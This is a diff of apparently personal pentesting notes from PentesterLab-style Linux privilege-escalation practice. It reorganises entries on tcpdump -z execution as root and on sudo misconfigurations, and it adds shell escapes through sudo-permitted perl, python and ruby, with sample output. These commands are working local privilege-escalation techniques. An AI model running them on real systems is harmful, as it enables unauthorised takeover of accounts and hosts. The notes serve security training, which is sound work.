@@ -40,8 +40,6 @@ Programs:
 - cp
 - tcpdump
 - awk
-- perl
-- python
 
 NMAP
 - nmap -V (version 4.53)
@@ -95,19 +93,25 @@ TCPDUMP
 - tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root”
 - we have to put commands into /tmp/.test
 
-PERL
+5. SUDO users
+- /etc/sudoers
+- sudo -l
+- sudo -u
+
+SUDO got privilige to run PERL as other user
 - sudo -u victim perl -e 'system("/bin/bash")
 
-PYTHON
+SUDO got privilige to run PYTHON as other user
 - pentesterlab@c74b5064f15a:~$ sudo -u victim python
 >>> from subprocess import call
 >>> call('id')
 uid=1001(victim) gid=1001(victim) groups=1001(victim)
 >>> call('/bin/bash')
 
-5. SUDO users
-- /etc/sudoers
-- su
+SUDO got privilige to run RUBY as other user
+- sudo -u victim /usr/bin/ruby -e 'require "irb" ; IRB.start(__FILE__)'
+irb(main):005:0> `id` (znaczek koło tyldy)
+=> "uid=1001(victim) gid=1001(victim) groups=1001(victim)\n"
 
 6. Path 
 - printenv
